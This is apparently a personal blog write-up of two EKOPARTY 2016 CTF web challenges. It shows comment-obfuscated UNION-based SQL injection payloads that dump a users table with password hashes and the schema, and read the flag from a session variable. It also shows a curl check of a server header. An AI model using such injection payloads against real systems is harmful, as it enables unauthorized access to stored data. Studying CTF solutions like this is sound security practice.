---
title: "EKOPARTY CTF"
date: 2016-10-28T20:25:29.000Z
tags:
  - "ctf"
  - "ekoparty"
feature_image: "content/images/2016/10/Zrzut-ekranu-2016-10-28-o-21.37.46.webp"
---

# EKOPARTY CTF

Another CTF during in the week - I hate that (I can't participate as much I as want too) but anyway I've took part in this CTF too.

My contribution:

  * tasks solved: 2
  * points: 150
  * time spent: 12h 32m

As stated above I've only managed to solved 2 tasks but actually one of them - web 100 - was quite interesting. It wasn't a difficult one but a lot of people had trouble with them.

# Super duper advanced attack

We were give a simple message:

> Can you find the flag?

> <http://0491e9f58d3c2196a6e1943adef9a9ab734ff5c9.ctf.site:20000>

The web100 task was a simple webpage that is shown below:

![](content/images/2016/10/Zrzut-ekranu-2016-10-28-o-21.38.50.webp)
You could very quickly find out that there's an SQL injection in the username field. But the more you look through the objects in the DB the more there was an impression that there is no flag there. And you could leak a lot from the DB. Everything in the `users` table:
[code]
    1 ferchu_papijas      17c4520f6cfd1ab53d8745e84681eb49
    2 el_peluca           5eb63bbbe01eeed093cb22bb8f5acdc3
    3 grandfather_fataku  8cbf64e506adb380e4938ee18c1def03
    4 henry_el_traba      200ceb26807d6bf99fd6f4f0d1ca54d4
    5 ana_lisa_melchotto  b5c0b187fe309af0f4d35982fd961d7e
    6 rosa_meltroso       33ee7e1eb504b6619c1b445ca1442c21
    7 mj_sex_machine      5f4dcc3b5aa765d61d8327deb882cf99
[/code]

`rosa_meltroso'/**/union/**/select/**/username,password/**/from/**/users#`

or ENGINES installed in mysql:
[code]
    1	CSV
    1	MRG_MYISAM
    1	MyISAM
    1	BLACKHOLE
    1	PERFORMANCE_SCHEMA
    1	InnoDB
    1	ARCHIVE
    1	MEMORY
    1	FEDERATED
[/code]

`rosa_meltroso'/**/union/**/SELECT/**/1,ENGINE/**/FROM/**/INFORMATION_SCHEMA.ENGINES#`

or even all the tables and all the columns!

[very long gist on github](https://gist.github.com/pawlos/a520762d6f0e65156dabda06b05478ed)

`rosa_meltroso'/**/union/**/SELECT/**/table_name,COLUMN_NAME/**/FROM/**/INFORMATION_SCHEMA.COLUMNS#`

You could dump all the data but there was no flag! I was going to write a tool that would extract all the values from all the columns but before I went on browsing through the [MySQL documentation](https://dev.mysql.com/doc/) and came across [CURRENT_USER()](https://dev.mysql.com/doc/refman/5.7/en/information-functions.html#function_current-user) and started wondering maybe the orgs have returned the flag there but `flag()` did not work. Executing some standard functions did get me nothing but I've remembered that there are some kind of global variables denoted with @ and started looking the same in mysql. Just to try out I went and executed statement like this:

`rosa_meltroso'/**/union/**/SELECT/**/1,@flag#`

and surprise, surprise - I got the flag (`EKO{do_not_forget_session_variables}`). Great!

This task was quite fun and looks like it was a bit of a challenge for people as one could see a lot of requests for a hint.
[code]
    [14:19]  are there any hints on web100?
    [14:32]  who is the admin for web 100?
    [15:03]   web 100..
    [15:10]  web 100 is confusing, flag is nowhere.....
    [15:19]  Web 100 Hints please, trying since last 10 hours
    [15:22]  *Web 100* I mean !
    [15:48]  somebody tell me, what the fuck web100 :D.
    [15:49]  Yeah I need to talk to a mod about web 100
    [15:50]  Same -.-
    [15:50]  Rip
    [15:50]  who are those 15 guys who solved that challenge -.-
    [15:58]  web150 - 41 solv, web100 - 15 0_o
    [15:59]  I have everything I need for web 100
    [15:59]  I just don't know where the flag is
    [15:59]  web100 seems to be kind of guessing bs stuff
    [16:40]  Heym, any admin for web 100?
    [16:40]  itay: +1 - ANY ADMIN for web100?
    [16:41]  +2
    [18:50]  any admins for web 100 online?
    [18:54]  yep, web100... not sure I understand the hint... :/ I'll wait for them to be back though :)
    [11:26]  hi ! can someone tell me what's web100
    [11:26]  ?
[/code]

I think I was 3rd (or somewhere around that) person who solved the challenge.

Later on in the CTF the organizes have revealed a clue:

> You don't need to search for the flag outside the DB, there is more than tables and columns in a DB.

and in the end it was solved by 103 teams.

# RFC 7230

This web task for 50 points I think is not worth mentioning but for the sake of completeness I will post a one line about it.

All it took to do it was to execute:

`curl -v ctf.ekoparty.org`

and check the response:

![](content/images/2016/10/Zrzut-ekranu-2016-10-28-o-17.50.15.webp)

as you can see the flag is there in the Server header. Not the most sophisticated task I must say. Anyway points collected!

Quite nice CTF. Had fun. I just need to solve more tasks next time.
